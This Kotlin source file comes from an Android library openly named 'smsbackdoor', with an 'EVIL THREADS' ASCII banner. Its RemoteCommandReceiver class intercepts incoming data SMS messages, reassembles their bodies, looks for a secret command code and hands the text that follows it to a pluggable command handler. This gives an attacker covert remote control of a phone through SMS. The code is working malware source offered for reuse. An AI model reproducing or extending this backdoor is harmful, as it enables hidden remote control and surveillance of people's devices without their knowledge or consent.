/*
Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package com.evilthreads.smsbackdoor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
class RemoteCommandReceiver: BroadcastReceiver(){
    override fun onReceive(ctx: Context?, intent: Intent?) {
        if(intent?.action.equals(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION)){
            val pdus = intent?.extras?.get("pdus") as Array<Any>
            val format = intent.extras?.getString("format")
            val command = StringBuilder().apply {
                pdus.forEach { pdu ->
                    val msg = SmsMessage.createFromPdu(pdu as ByteArray, format!!)
                    msg.messageBody?.let{ body -> append(body) }
                }
            }
            command.toString().takeIf { cmd -> cmd.contains(SmsBackdoor.commandCode) }?.let { cmd -> SmsBackdoor.commandHandler?.invoke(cmd.split(SmsBackdoor.commandCode)[1]) }
        }
    }
}